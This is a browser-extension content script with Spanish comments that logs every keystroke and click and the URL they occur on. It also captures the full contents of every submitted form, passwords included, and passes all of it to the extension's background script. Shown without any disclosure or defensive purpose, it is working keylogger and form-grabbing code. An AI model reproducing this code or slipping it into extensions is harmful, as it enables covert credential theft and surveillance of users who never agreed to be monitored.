// content.js -

if (typeof browser === "undefined") {
    var browser = chrome;
}

const handleResponse = () => {
    // ARREGLO 2: Se usa 'browser'
    if (browser.runtime.lastError) {
        // console.warn('Error al enviar mensaje:', browser.runtime.lastError.message);
    }
};

document.addEventListener('keydown', function(event) {
    const data = {
        key: event.key,
        code: event.code,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        target: event.target.tagName,
        targetType: event.target.type || 'N/A'
    };

    // ARREGLO 2: Se usa 'browser'
    browser.runtime.sendMessage({
        type: 'keystroke',
        data: data
    }, handleResponse);

}, true);

document.addEventListener('submit', function(event) {
    const form = event.target;
    const formData = new FormData(form);
    const data = {};
    
    formData.forEach((value, key) => {
        data[key] = value;
    });

    // ARREGLO 2: Se usa 'browser'
    browser.runtime.sendMessage({
        type: 'form_submit',
        data: {
            url: window.location.href,
            timestamp: new Date().toISOString(),
            formData: data
        }
    }, handleResponse); 
}, true);

document.addEventListener('click', function(event) {
    // ARREGLO 2: Se usa 'browser'
    browser.runtime.sendMessage({
        type: 'click',
        data: {
            element: event.target.tagName,
            url: window.location.href,
            timestamp: new Date().toISOString()
        }
    }, handleResponse); 
}, true);